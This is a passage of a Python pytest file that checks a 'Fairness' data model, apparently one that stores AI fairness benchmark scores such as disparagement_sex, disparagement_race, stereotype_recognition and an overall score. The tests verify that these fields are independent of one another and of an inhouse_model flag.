    def test_disparagement_fields_independence(self, valid_fairness_data):
        """Test that disparagement_sex and disparagement_race are independent"""
        valid_fairness_data["disparagement_sex"] = "0.9"
        valid_fairness_data["disparagement_race"] = "0.95"
        
        fairness = Fairness(**valid_fairness_data)
        
        assert fairness.disparagement_sex == "0.9"
        assert fairness.disparagement_race == "0.95"
        assert fairness.disparagement_sex != fairness.disparagement_race
    
    def test_overall_vs_individual_scores(self, valid_fairness_data):
        """Test that overall score can differ from individual scores"""
        valid_fairness_data["stereotype_recognition"] = "0.5"
        valid_fairness_data["disparagement_sex"] = "0.8"
        valid_fairness_data["overall"] = "0.65"  # Aggregate
        
        fairness = Fairness(**valid_fairness_data)
        
        # Overall can be different from individual scores
        assert fairness.overall == "0.65"
        assert fairness.stereotype_recognition == "0.5"
    
    def test_inhouse_model_flag_independence(self, valid_fairness_data):
        """Test that inhouse_model flag doesn't affect score fields"""
        valid_fairness_data["inhouse_model"] = True
        fairness1 = Fairness(**valid_fairness_data)
        
        valid_fairness_data["inhouse_model"] = False
        fairness2 = Fairness(**valid_fairness_data)
        
        # Score fields should be same regardless of inhouse_model
        assert fairness1.overall == fairness2.overall
        assert fairness1.stereotype_recognition == fairness2.stereotype_recognition
        # But inhouse_model should differ
        assert fairness1.inhouse_model != fairness2.inhouse_model


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
